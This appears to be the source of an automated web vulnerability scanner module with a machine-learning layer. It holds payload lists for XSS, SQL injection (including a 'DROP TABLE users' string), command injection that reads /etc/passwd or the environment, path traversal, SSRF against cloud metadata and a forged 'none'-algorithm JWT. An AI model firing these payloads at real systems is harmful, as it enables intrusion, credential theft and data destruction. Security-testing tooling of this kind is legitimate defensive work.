"""
Autonomous Vulnerability Testing Module for Sniper Tool.

This module extends the Sniper toolkit with autonomous vulnerability testing capabilities,
including dynamic tool discovery, payload generation, and automated testing for common
web vulnerabilities like XSS, CSRF, SQL Injection, etc.

Features:
- Autonomous discovery and evaluation of new security tools
- Intelligent payload generation for various vulnerability types
- Self-learning capabilities to improve detection rates
- Contextual payload adaptation based on target environment
- Integration with existing Sniper modules

Dependencies:
- numpy
- pandas
- scikit-learn
- requests
- beautifulsoup4
"""

import json
import logging
import os
import random
import re
import string
import subprocess
import time
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union

import numpy as np
import requests
from bs4 import BeautifulSoup
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer

# Set up logging
logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Enumeration of supported vulnerability types for testing."""

    XSS = "xss"
    SQLI = "sql_injection"
    CSRF = "csrf"
    COMMAND_INJECTION = "command_injection"
    OPEN_REDIRECT = "open_redirect"
    SSRF = "ssrf"
    PATH_TRAVERSAL = "path_traversal"
    XML_INJECTION = "xml_injection"
    JWT_VULNERABILITY = "jwt_vulnerability"
    NOSQL_INJECTION = "nosql_injection"
    COOKIE_ISSUES = "cookie_issues"
    CORS_MISCONFIGURATION = "cors_misconfiguration"


@dataclass
class Payload:
    """Represents a vulnerability testing payload."""

    value: str
    vulnerability_type: VulnerabilityType
    encoded: bool = False
    context: Optional[str] = None
    description: Optional[str] = None
    success_indicators: List[str] = None

    def __post_init__(self):
        if self.success_indicators is None:
            self.success_indicators = []


@dataclass
class PayloadResult:
    """Result of a payload test."""

    payload: Payload
    success: bool
    evidence: Optional[str] = None
    response_code: Optional[int] = None
    response_time: Optional[float] = None
    notes: Optional[str] = None


class ToolDiscovery:
    """
    Responsible for discovering and evaluating new security tools.
    """

    def __init__(self, tools_directory: Optional[str] = None):
        """
        Initialize the tool discovery module.

        Args:
            tools_directory: Directory to store discovered tools
        """
        self.tools_directory = tools_directory or os.path.join(
            os.path.expanduser("~"), ".sniper", "discovered_tools"
        )
        os.makedirs(self.tools_directory, exist_ok=True)

        # Track discovered and evaluated tools
        self.discovered_tools: Dict[str, Dict[str, Any]] = {}
        self._load_discovered_tools()

        # Sources for tool discovery
        self.sources = [
            "https://github.com/topics/security-tools",
            "https://github.com/topics/penetration-testing",
            "https://github.com/topics/vulnerability-scanner",
            "https://github.com/topics/web-security",
        ]

    def _load_discovered_tools(self):
        """Load previously discovered tools from storage."""
        tools_file = os.path.join(self.tools_directory, "discovered_tools.json")
        if os.path.exists(tools_file):
            try:
                with open(tools_file, "r") as f:
                    self.discovered_tools = json.load(f)
                logger.info(f"Loaded {len(self.discovered_tools)} discovered tools")
            except Exception as e:
                logger.error(f"Error loading discovered tools: {e}")

    def _save_discovered_tools(self):
        """Save discovered tools to storage."""
        tools_file = os.path.join(self.tools_directory, "discovered_tools.json")
        try:
            with open(tools_file, "w") as f:
                json.dump(self.discovered_tools, f, indent=2)
            logger.info(f"Saved {len(self.discovered_tools)} discovered tools")
        except Exception as e:
            logger.error(f"Error saving discovered tools: {e}")

    def discover_tools(self, max_tools: int = 5) -> List[Dict[str, Any]]:
        """
        Discover new security tools from various sources.

        Args:
            max_tools: Maximum number of new tools to discover

        Returns:
            List of newly discovered tools
        """
        new_tools = []
        for source in self.sources:
            try:
                # This is a simplified implementation - in reality, you'd use
                # more sophisticated scraping or API calls to GitHub/other sources
                if source.startswith("https://github.com/topics/"):
                    tools = self._scrape_github_topic(source)
                    new_tools.extend(tools)

                    if len(new_tools) >= max_tools:
                        break
            except Exception as e:
                logger.error(f"Error discovering tools from {source}: {e}")

        # Process and store the new tools
        for tool in new_tools[:max_tools]:
            tool_id = tool["name"].lower().replace(" ", "-")
            if tool_id not in self.discovered_tools:
                self.discovered_tools[tool_id] = {
                    **tool,
                    "discovered_at": time.time(),
                    "evaluation": {"status": "pending", "score": 0.0},
                }

        self._save_discovered_tools()
        return new_tools[:max_tools]

    def _scrape_github_topic(self, topic_url: str) -> List[Dict[str, Any]]:
        """
        Scrape GitHub topics page for security tools.

        Args:
            topic_url: URL of the GitHub topic

        Returns:
            List of tool dictionaries with metadata
        """
        # This would be implemented with beautiful soup or similar
        # Here we'll just return mock data for illustration
        logger.info(f"Would scrape {topic_url} for tools in real implementation")

        # Mock data - in real implementation, this would be scraped
        mock_tools = [
            {
                "name": f"security-tool-{i}",
                "url": f"https://github.com/user/security-tool-{i}",
                "description": f"A powerful security tool for {random.choice(['XSS', 'SQL injection', 'CSRF', 'scanning'])}",
                "stars": random.randint(50, 5000),
                "category": random.choice(
                    ["reconnaissance", "vulnerability_scanning", "exploitation"]
                ),
                "language": random.choice(["Python", "Go", "Rust", "JavaScript"]),
            }
            for i in range(1, 6)
        ]

        return mock_tools

    def evaluate_tool(self, tool_id: str) -> Dict[str, Any]:
        """
        Evaluate a discovered tool for effectiveness and usability.

        Args:
            tool_id: ID of the tool to evaluate

        Returns:
            Evaluation results
        """
        if tool_id not in self.discovered_tools:
            return {"error": "Tool not found"}

        tool = self.discovered_tools[tool_id]

        # This would involve:
        # 1. Attempting to install the tool
        # 2. Running it against test targets
        # 3. Evaluating its output and effectiveness
        # 4. Rating it on various criteria

        # Mock implementation
        logger.info(f"Would evaluate tool {tool_id} in real implementation")

        evaluation = {
            "status": "completed",
            "score": random.uniform(0.5, 0.95),
            "installation_difficulty": random.uniform(0, 1),
            "output_quality": random.uniform(0.5, 0.95),
            "performance": random.uniform(0.3, 0.9),
            "documentation": random.uniform(0.2, 0.9),
            "completed_at": time.time(),
        }

        # Update the tool's evaluation
        self.discovered_tools[tool_id]["evaluation"] = evaluation
        self._save_discovered_tools()

        return evaluation

    def get_recommended_tools(
        self, vulnerability_type: VulnerabilityType, count: int = 3
    ) -> List[Dict[str, Any]]:
        """
        Get recommended tools for a specific vulnerability type.

        Args:
            vulnerability_type: Type of vulnerability to test
            count: Number of tools to recommend

        Returns:
            List of recommended tools
        """
        # Filter tools that have been evaluated and are suitable for this vulnerability type
        suitable_tools = []

        for tool_id, tool in self.discovered_tools.items():
            evaluation = tool.get("evaluation", {})
            if (
                evaluation.get("status") == "completed"
                and evaluation.get("score", 0) >= 0.7
            ):
                # Check if tool seems suitable for this vulnerability type
                if vulnerability_type.value in tool.get(
                    "description", ""
                ).lower() or self._is_tool_suitable_for_vulnerability(
                    tool, vulnerability_type
                ):
                    suitable_tools.append(
                        {
                            "id": tool_id,
                            "name": tool.get("name"),
                            "description": tool.get("description"),
                            "score": evaluation.get("score", 0),
                            "url": tool.get("url"),
                        }
                    )

        # Sort by score and return top N
        suitable_tools.sort(key=lambda t: t.get("score", 0), reverse=True)
        return suitable_tools[:count]

    def _is_tool_suitable_for_vulnerability(
        self, tool: Dict[str, Any], vuln_type: VulnerabilityType
    ) -> bool:
        """
        Determine if a tool is suitable for a specific vulnerability type.

        Args:
            tool: Tool dictionary
            vuln_type: Vulnerability type

        Returns:
            Whether the tool is suitable
        """
        # This would be more sophisticated in reality
        description = tool.get("description", "").lower()

        vuln_keywords = {
            VulnerabilityType.XSS: ["xss", "cross site", "script", "injection"],
            VulnerabilityType.SQLI: ["sql", "injection", "database"],
            VulnerabilityType.CSRF: ["csrf", "cross site", "forgery", "request"],
            VulnerabilityType.COMMAND_INJECTION: [
                "command",
                "injection",
                "exec",
                "rce",
            ],
            VulnerabilityType.OPEN_REDIRECT: ["redirect", "open redirect"],
            VulnerabilityType.SSRF: ["ssrf", "server side", "request forgery"],
            VulnerabilityType.PATH_TRAVERSAL: [
                "path",
                "traversal",
                "directory",
                "lfi",
                "rfi",
            ],
            VulnerabilityType.JWT_VULNERABILITY: ["jwt", "token", "json web token"],
        }

        if vuln_type in vuln_keywords:
            return any(kw in description for kw in vuln_keywords[vuln_type])

        return False


class PayloadGenerator:
    """
    Responsible for generating payloads for different vulnerability types.
    Uses ML to improve payload effectiveness over time.
    """

    def __init__(self, payloads_directory: Optional[str] = None):
        """
        Initialize the payload generator.

        Args:
            payloads_directory: Directory to store payload data
        """
        self.payloads_directory = payloads_directory or os.path.join(
            os.path.expanduser("~"), ".sniper", "payloads"
        )
        os.makedirs(self.payloads_directory, exist_ok=True)

        # Load default payloads from built-in library
        self.payloads: Dict[VulnerabilityType, List[Payload]] = {}
        self._load_default_payloads()

        # Set up success tracking for ML optimization
        self.payload_success_history: List[PayloadResult] = []
        self._load_success_history()

        # ML model for payload optimization
        self.payload_model = None
        self.vectorizer = TfidfVectorizer(analyzer="char", ngram_range=(2, 5))

    def _load_default_payloads(self):
        """Load built-in default payloads for various vulnerability types."""
        # XSS Payloads
        self.payloads[VulnerabilityType.XSS] = [
            Payload(
                value='<script>alert("XSS")</script>',
                vulnerability_type=VulnerabilityType.XSS,
                context="html",
                success_indicators=["alert(", "XSS"],
                description="Basic XSS payload",
            ),
            Payload(
                value='<img src=x onerror=alert("XSS")>',
                vulnerability_type=VulnerabilityType.XSS,
                context="html",
                success_indicators=["alert(", "XSS"],
                description="Image XSS payload",
            ),
            Payload(
                value='"><svg onload=alert("XSS")>',
                vulnerability_type=VulnerabilityType.XSS,
                context="attribute",
                success_indicators=["alert(", "XSS"],
                description="SVG XSS payload",
            ),
            Payload(
                value='javascript:alert("XSS")',
                vulnerability_type=VulnerabilityType.XSS,
                context="url",
                success_indicators=["alert(", "XSS"],
                description="JavaScript URL XSS payload",
            ),
            Payload(
                value='"-confirm("XSS")-"',
                vulnerability_type=VulnerabilityType.XSS,
                context="javascript",
                success_indicators=["confirm(", "XSS"],
                description="JavaScript context XSS payload",
            ),
        ]

        # SQL Injection Payloads
        self.payloads[VulnerabilityType.SQLI] = [
            Payload(
                value="' OR '1'='1",
                vulnerability_type=VulnerabilityType.SQLI,
                success_indicators=[
                    "admin",
                    "password",
                    "username",
                    "select",
                    "from",
                    "where",
                ],
                description="Basic SQL injection for authentication bypass",
            ),
            Payload(
                value="'; DROP TABLE users; --",
                vulnerability_type=VulnerabilityType.SQLI,
                success_indicators=["syntax", "error", "mysql", "sqlite", "postgresql"],
                description="Destructive SQL injection (for testing only with error detection)",
            ),
            Payload(
                value="' UNION SELECT NULL, username, password FROM users; --",
                vulnerability_type=VulnerabilityType.SQLI,
                success_indicators=["admin", "password", "username"],
                description="UNION-based SQL injection for data extraction",
            ),
            Payload(
                value="' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y); --",
                vulnerability_type=VulnerabilityType.SQLI,
                success_indicators=["error", "duplicate", "group by"],
                description="Error-based SQL injection for data extraction",
            ),
            Payload(
                value="' AND (SELECT * FROM (SELECT(SLEEP(1)))x) AND '1'='1",
                vulnerability_type=VulnerabilityType.SQLI,
                success_indicators=[],  # Time-based, so no text indicators
                description="Time-based blind SQL injection",
            ),
        ]

        # CSRF Payloads
        self.payloads[VulnerabilityType.CSRF] = [
            Payload(
                value='<form id="csrf-form" action="{target_url}" method="POST"><input type="hidden" name="{param}" value="{value}"></form><script>document.getElementById("csrf-form").submit();</script>',
                vulnerability_type=VulnerabilityType.CSRF,
                context="html",
                description="Basic CSRF form submission",
            ),
        ]

        # Command Injection Payloads
        self.payloads[VulnerabilityType.COMMAND_INJECTION] = [
            Payload(
                value="; ls -la",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                success_indicators=["total", "drwx", "rwx"],
                description="Basic command injection to list files (Unix)",
            ),
            Payload(
                value="& dir",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                success_indicators=["Volume", "Directory", "File(s)", "Dir(s)"],
                description="Basic command injection to list files (Windows)",
            ),
            Payload(
                value="`ping -c 3 127.0.0.1`",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                success_indicators=["ping", "icmp", "ttl=", "time="],
                description="Command injection with backticks",
            ),
            Payload(
                value="$(cat /etc/passwd)",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                success_indicators=["root:", "bin:", "daemon:", "nobody:"],
                description="Command injection with $() syntax",
            ),
        ]

        # Path Traversal Payloads
        self.payloads[VulnerabilityType.PATH_TRAVERSAL] = [
            Payload(
                value="../../../etc/passwd",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                success_indicators=["root:", "bin:", "daemon:", "nobody:"],
                description="Basic path traversal for Unix /etc/passwd",
            ),
            Payload(
                value="..%2f..%2f..%2fetc%2fpasswd",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                encoded=True,
                success_indicators=["root:", "bin:", "daemon:", "nobody:"],
                description="URL encoded path traversal for Unix /etc/passwd",
            ),
            Payload(
                value="..\\..\\..\\windows\\win.ini",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                success_indicators=[
                    "for 16-bit app support",
                    "[fonts]",
                    "[extensions]",
                ],
                description="Basic path traversal for Windows win.ini",
            ),
        ]

        # SSRF Payloads
        self.payloads[VulnerabilityType.SSRF] = [
            Payload(
                value="http://127.0.0.1:22",
                vulnerability_type=VulnerabilityType.SSRF,
                success_indicators=["SSH", "OpenSSH", "connection"],
                description="SSRF targeting local SSH service",
            ),
            Payload(
                value="http://169.254.169.254/latest/meta-data/",
                vulnerability_type=VulnerabilityType.SSRF,
                success_indicators=["ami-id", "instance-id", "security-groups"],
                description="SSRF targeting AWS metadata service",
            ),
            Payload(
                value="file:///etc/passwd",
                vulnerability_type=VulnerabilityType.SSRF,
                success_indicators=["root:", "bin:", "daemon:", "nobody:"],
                description="SSRF with file protocol",
            ),
        ]

        # JWT Vulnerability Payloads
        self.payloads[VulnerabilityType.JWT_VULNERABILITY] = [
            Payload(
                value="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.",
                vulnerability_type=VulnerabilityType.JWT_VULNERABILITY,
                success_indicators=["admin", "authenticated", "authorized"],
                description="JWT with 'none' algorithm",
            ),
        ]

    def _load_success_history(self):
        """Load payload success history from storage for ML training."""
        history_file = os.path.join(self.payloads_directory, "payload_history.json")
        if os.path.exists(history_file):
            try:
                with open(history_file, "r") as f:
                    history_data = json.load(f)

                self.payload_success_history = [
                    PayloadResult(
                        payload=Payload(
                            value=item["payload"]["value"],
                            vulnerability_type=VulnerabilityType(
                                item["payload"]["vulnerability_type"]
                            ),
                            encoded=item["payload"].get("encoded", False),
                            context=item["payload"].get("context"),
                            description=item["payload"].get("description"),
                            success_indicators=item["payload"].get(
                                "success_indicators", []
                            ),
                        ),
                        success=item["success"],
                        evidence=item.get("evidence"),
                        response_code=item.get("response_code"),
                        response_time=item.get("response_time"),
                        notes=item.get("notes"),
                    )
                    for item in history_data
                ]

                logger.info(
                    f"Loaded {len(self.payload_success_history)} payload history items"
                )
                self._train_model()
            except Exception as e:
                logger.error(f"Error loading payload history: {e}")

    def _save_success_history(self):
        """Save payload success history to storage."""
        history_file = os.path.join(self.payloads_directory, "payload_history.json")
        try:
            history_data = [
                {
                    "payload": {
                        "value": result.payload.value,
                        "vulnerability_type": result.payload.vulnerability_type.value,
                        "encoded": result.payload.encoded,
                        "context": result.payload.context,
                        "description": result.payload.description,
                        "success_indicators": result.payload.success_indicators,
                    },
                    "success": result.success,
                    "evidence": result.evidence,
                    "response_code": result.response_code,
                    "response_time": result.response_time,
                    "notes": result.notes,
                }
                for result in self.payload_success_history
            ]

            with open(history_file, "w") as f:
                json.dump(history_data, f, indent=2)

            logger.info(
                f"Saved {len(self.payload_success_history)} payload history items"
            )
        except Exception as e:
            logger.error(f"Error saving payload history: {e}")

    def _train_model(self):
        """Train ML model on payload success history."""
        if len(self.payload_success_history) < 20:
            logger.info("Not enough payload history to train model")
            return

        try:
            # Extract features and labels
            texts = [result.payload.value for result in self.payload_success_history]
            labels = [int(result.success) for result in self.payload_success_history]

            # Transform payload text to feature vectors
            X = self.vectorizer.fit_transform(texts)

            # Train model
            self.payload_model = RandomForestClassifier(
                n_estimators=50, random_state=42
            )
            self.payload_model.fit(X, labels)

            logger.info("Trained payload model on history data")
        except Exception as e:
            logger.error(f"Error training payload model: {e}")

    def record_result(self, result: PayloadResult):
        """
        Record the result of a payload test for ML improvement.

        Args:
            result: The payload test result
        """
        self.payload_success_history.append(result)
        self._save_success_history()

        # Retrain model periodically
        if len(self.payload_success_history) % 10 == 0:
            self._train_model()

    def generate_payloads(
        self,
        vulnerability_type: VulnerabilityType,
        count: int = 5,
        context: Optional[str] = None,
    ) -> List[Payload]:
        """
        Generate payloads for a specific vulnerability type.

        Args:
            vulnerability_type: Type of vulnerability to test
            count: Number of payloads to generate
            context: Optional context for the payload generation

        Returns:
            List of generated payloads
        """
        # Start with default payloads
        base_payloads = self.payloads.get(vulnerability_type, [])
        if not base_payloads:
            logger.warning(f"No base payloads for {vulnerability_type}")
            return []

        # Filter by context if provided
        if context:
            context_payloads = [p for p in base_payloads if p.context == context]
            if context_payloads:
                base_payloads = context_payloads

        # If we have enough default payloads, use them
        if len(base_payloads) >= count:
            return base_payloads[:count]

        # Otherwise, we need to generate more
        generated_payloads = base_payloads.copy()

        # Add variations if we have enough base payloads to work with
        if base_payloads:
            for i in range(count - len(base_payloads)):
                # Pick a random base payload to modify
                base_payload = random.choice(base_payloads)
                new_payload = self._create_payload_variation(base_payload)
                if new_payload:
                    generated_payloads.append(new_payload)

        return generated_payloads[:count]

    def _create_payload_variation(self, base_payload: Payload) -> Optional[Payload]:
        """
        Create a variation of a base payload for more diverse testing.

        Args:
            base_payload: The base payload to create a variation from

        Returns:
            A new payload variation, or None if creation failed
        """
        vulnerability_type = base_payload.vulnerability_type

        if vulnerability_type == VulnerabilityType.XSS:
            return self._create_xss_variation(base_payload)
        elif vulnerability_type == VulnerabilityType.SQLI:
            return self._create_sqli_variation(base_payload)
        elif vulnerability_type == VulnerabilityType.COMMAND_INJECTION:
            return self._create_command_injection_variation(base_payload)
        else:
            # For other types, use basic randomization techniques
            return self._create_generic_variation(base_payload)

    def _create_xss_variation(self, base_payload: Payload) -> Payload:
        """Create a variation of an XSS payload."""
        value = base_payload.value

        # Simple variations
        variations = [
            value.replace('alert("XSS")', "alert(document.domain)"),
            value.replace('alert("XSS")', 'confirm("XSS")'),
            value.replace('alert("XSS")', 'prompt("XSS")'),
            value.replace("<script>", '<script>console.log("XSS");'),
            value.replace(
                "XSS", "XSS_" + "".join(random.choices(string.ascii_lowercase, k=4))
            ),
        ]

        # More complex variations
        if "<script>" in value:
            variations.append(value.replace("<script>", "<sCriPt>"))
            variations.append(value.replace("<script>", "<%00script>"))
        elif "<img" in value:
            variations.append(value.replace("<img", '<INPUT TYPE="IMAGE"'))
            variations.append(value.replace("onerror", "oNErroR"))

        # Select a random variation
        new_value = random.choice(variations)

        return Payload(
            value=new_value,
            vulnerability_type=VulnerabilityType.XSS,
            context=base_payload.context,
            description=f"Variation of: {base_payload.description}",
            success_indicators=(
                base_payload.success_indicators.copy()
                if base_payload.success_indicators
                else []
            ),
        )

    def _create_sqli_variation(self, base_payload: Payload) -> Payload:
        """Create a variation of a SQL injection payload."""
        value = base_payload.value

        # Simple variations
        variations = [
            value.replace("'", '"'),
            value.replace("'", "%27"),
            value.replace(" ", "%20"),
            value + " -- ",
            value + "#",
        ]

        # Select a random variation
        new_value = random.choice(variations)

        return Payload(
            value=new_value,
            vulnerability_type=VulnerabilityType.SQLI,
            context=base_payload.context,
            description=f"Variation of: {base_payload.description}",
            success_indicators=(
                base_payload.success_indicators.copy()
                if base_payload.success_indicators
                else []
            ),
        )

    def _create_command_injection_variation(self, base_payload: Payload) -> Payload:
        """Create a variation of a command injection payload."""
        value = base_payload.value

        # Command variations
        if "ls" in value:
            commands = ["ls -la", "id", "whoami", "pwd", "cat /etc/passwd"]
        elif "dir" in value:
            commands = ["dir", "whoami", "echo %username%", "type C:\\Windows\\win.ini"]
        else:
            commands = ["id", "whoami", "uname -a", "env"]

        # Syntax variations
        prefixes = ["", ";", "|", "&&", "||", "`", "$(", "& ", "%0a"]

        # Create variation
        new_cmd = random.choice(commands)
        new_prefix = random.choice(prefixes)
        new_value = f"{new_prefix}{new_cmd}"

        return Payload(
            value=new_value,
            vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            context=base_payload.context,
            description=f"Variation of: {base_payload.description}",
            success_indicators=(
                base_payload.success_indicators.copy()
                if base_payload.success_indicators
                else []
            ),
        )

    def _create_generic_variation(self, base_payload: Payload) -> Payload:
        """Create a generic variation for any payload type."""
        value = base_payload.value

        # Basic character substitutions
        substitutions = [
            (" ", "%20"),
            ("<", "%3C"),
            (">", "%3E"),
            ('"', "%22"),
            ("'", "%27"),
            ("/", "%2F"),
            ("\\", "%5C"),
        ]

        # Apply a random substitution
        new_value = value
        for orig, subst in random.sample(substitutions, min(3, len(substitutions))):
            # Only substitute some instances, not all
            if orig in new_value and random.random() > 0.5:
                pos = new_value.find(orig)
                new_value = new_value[:pos] + subst + new_value[pos + len(orig) :]

        return Payload(
            value=new_value,
            vulnerability_type=base_payload.vulnerability_type,
            context=base_payload.context,
            encoded=any(s[1].startswith("%") for s in substitutions),
            description=f"Encoded variation of: {base_payload.description}",
            success_indicators=(
                base_payload.success_indicators.copy()
                if base_payload.success_indicators
                else []
            ),
        )


class AutonomousTester:
    """
    Main class for autonomous vulnerability testing.
    Integrates tool discovery and payload generation to perform automated testing.
    """

    def __init__(self, data_directory: Optional[str] = None):
        """
        Initialize the autonomous tester.

        Args:
            data_directory: Base directory for storing data
        """
        self.data_directory = data_directory or os.path.join(
            os.path.expanduser("~"), ".sniper", "autonomous_tester"
        )
        os.makedirs(self.data_directory, exist_ok=True)

        # Initialize components
        self.tool_discovery = ToolDiscovery(os.path.join(self.data_directory, "tools"))
        self.payload_generator = PayloadGenerator(
            os.path.join(self.data_directory, "payloads")
        )

        # Results tracking
        self.test_results: Dict[str, List[PayloadResult]] = {}

    def discover_new_tools(self, max_tools: int = 3) -> List[Dict[str, Any]]:
        """
        Discover new security tools that can be integrated.

        Args:
            max_tools: Maximum number of new tools to discover

        Returns:
            List of newly discovered tools
        """
        return self.tool_discovery.discover_tools(max_tools)

    def test_vulnerability(
        self,
        target_url: str,
        vulnerability_type: VulnerabilityType,
        params: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        count: int = 5,
    ) -> List[PayloadResult]:
        """
        Test a target for a specific vulnerability type.

        Args:
            target_url: URL to test
            vulnerability_type: Type of vulnerability to test for
            params: Optional parameters to include in the request
            headers: Optional headers to include in the request
            cookies: Optional cookies to include in the request
            count: Number of payloads to test

        Returns:
            List of payload test results
        """
        # Generate payloads
        payloads = self.payload_generator.generate_payloads(
            vulnerability_type=vulnerability_type, count=count
        )

        if not payloads:
            logger.warning(f"No payloads generated for {vulnerability_type}")
            return []

        # Test each payload
        results = []
        for payload in payloads:
            result = self._test_payload(
                target_url=target_url,
                payload=payload,
                params=params,
                headers=headers,
                cookies=cookies,
            )
            results.append(result)

            # Record result for ML improvement
            self.payload_generator.record_result(result)

            # If successful, we can stop testing
            if result.success:
                logger.info(
                    f"Successful payload found for {vulnerability_type}: {payload.value}"
                )
                break

        # Store results
        test_id = f"{vulnerability_type.value}_{int(time.time())}"
        self.test_results[test_id] = results

        return results

    def _test_payload(
        self,
        target_url: str,
        payload: Payload,
        params: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> PayloadResult:
        """
        Test a single payload against a target.

        Args:
            target_url: URL to test
            payload: Payload to test
            params: Optional parameters to include in the request
            headers: Optional headers to include in the request
            cookies: Optional cookies to include in the request

        Returns:
            Result of the payload test
        """
        logger.info(f"Testing {payload.vulnerability_type} payload: {payload.value}")

        try:
            # Prepare the request
            session = requests.Session()
            if cookies:
                for key, value in cookies.items():
                    session.cookies.set(key, value)

            request_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            if headers:
                request_headers.update(headers)

            # Insert the payload
            # For simplicity, we'll just add it to each parameter or create a new one
            request_params = {}
            if params:
                request_params.update(params)

            # Add payload to params or use it as a dedicated parameter
            if payload.vulnerability_type in [
                VulnerabilityType.XSS,
                VulnerabilityType.SQLI,
            ]:
                if params:
                    # Inject into an existing parameter
                    param_key = random.choice(list(params.keys()))
                    request_params[param_key] = payload.value
                else:
                    # Create a new parameter
                    request_params["test"] = payload.value
            elif payload.vulnerability_type == VulnerabilityType.PATH_TRAVERSAL:
                # For path traversal, add to the URL
                if "?" in target_url:
                    test_url = f"{target_url}&file={payload.value}"
                else:
                    test_url = f"{target_url}?file={payload.value}"
            else:
                # Default approach
                test_url = target_url
                if params:
                    param_key = random.choice(list(params.keys()))
                    request_params[param_key] = payload.value
                else:
                    request_params["test"] = payload.value

            # Send the request and measure time
            start_time = time.time()
            if payload.vulnerability_type == VulnerabilityType.PATH_TRAVERSAL:
                response = session.get(
                    test_url, headers=request_headers, allow_redirects=True, timeout=10
                )
            else:
                response = session.get(
                    target_url,
                    params=request_params,
                    headers=request_headers,
                    allow_redirects=True,
                    timeout=10,
                )
            response_time = time.time() - start_time

            # Check for success indicators in the response
            response_text = response.text
            success = False
            evidence = None

            # First check the basic indicators
            for indicator in payload.success_indicators:
                if indicator in response_text:
                    success = True
                    evidence = f"Found indicator '{indicator}' in response"
                    break

            # For XSS, check if we can extract potential script execution
            if payload.vulnerability_type == VulnerabilityType.XSS and not success:
                soup = BeautifulSoup(response_text, "html.parser")
                scripts = soup.find_all(["script", "img", "svg", "iframe"])

                for script in scripts:
                    script_text = str(script)
                    # Check if our payload or parts of it are in the script
                    payload_parts = (
                        payload.value.replace("<", "").replace(">", "").split()
                    )
                    for part in payload_parts:
                        if len(part) > 3 and part in script_text:
                            success = True
                            evidence = f"Found payload part '{part}' in script: {script_text[:100]}"
                            break
                    if success:
                        break

            # For SQL injection, look for database errors
            if payload.vulnerability_type == VulnerabilityType.SQLI and not success:
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite3::",
                    "syntax error",
                    "unclosed quotation mark",
                ]
                for error in sql_errors:
                    if error in response_text:
                        success = True
                        evidence = f"Found SQL error: {error}"
                        break

            # Create result
            result = PayloadResult(
                payload=payload,
                success=success,
                evidence=evidence,
                response_code=response.status_code,
                response_time=response_time,
                notes=f"Response length: {len(response_text)}",
            )

            return result

        except Exception as e:
            logger.error(f"Error testing payload: {e}")
            return PayloadResult(
                payload=payload,
                success=False,
                evidence=None,
                response_code=None,
                response_time=None,
                notes=f"Error: {str(e)}",
            )

    def comprehensive_scan(
        self,
        target_url: str,
        params: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Dict[str, List[PayloadResult]]:
        """
        Perform a comprehensive scan for multiple vulnerability types.

        Args:
            target_url: URL to test
            params: Optional parameters to include in the request
            headers: Optional headers to include in the request
            cookies: Optional cookies to include in the request

        Returns:
            Dictionary of vulnerability types to test results
        """
        results = {}

        # Test each vulnerability type
        for vuln_type in VulnerabilityType:
            logger.info(f"Testing for {vuln_type.value}")

            vuln_results = self.test_vulnerability(
                target_url=target_url,
                vulnerability_type=vuln_type,
                params=params,
                headers=headers,
                cookies=cookies,
                count=3,  # Reduced count for each type to keep total reasonable
            )

            results[vuln_type.value] = vuln_results

            # If we found something, we can focus testing
            if any(result.success for result in vuln_results):
                logger.info(
                    f"Found vulnerability of type {vuln_type.value}, testing more payloads"
                )
                # Test more payloads for this type
                additional_results = self.test_vulnerability(
                    target_url=target_url,
                    vulnerability_type=vuln_type,
                    params=params,
                    headers=headers,
                    cookies=cookies,
                    count=5,  # More payloads for confirmed vulnerability
                )
                results[vuln_type.value].extend(additional_results)

        return results

    def get_summary(self, results: Dict[str, List[PayloadResult]]) -> Dict[str, Any]:
        """
        Generate a summary of test results.

        Args:
            results: Dictionary of vulnerability types to test results

        Returns:
            Summary dictionary
        """
        summary = {
            "total_tests": sum(len(r) for r in results.values()),
            "successful_tests": sum(
                sum(1 for result in r if result.success) for r in results.values()
            ),
            "vulnerabilities_found": [],
            "details": {},
        }

        for vuln_type, vuln_results in results.items():
            successful = [r for r in vuln_results if r.success]
            if successful:
                summary["vulnerabilities_found"].append(vuln_type)

                # Add details for this vulnerability type
                summary["details"][vuln_type] = {
                    "tests": len(vuln_results),
                    "successful": len(successful),
                    "payloads": [
                        {"value": r.payload.value, "evidence": r.evidence}
                        for r in successful
                    ],
                }

        return summary
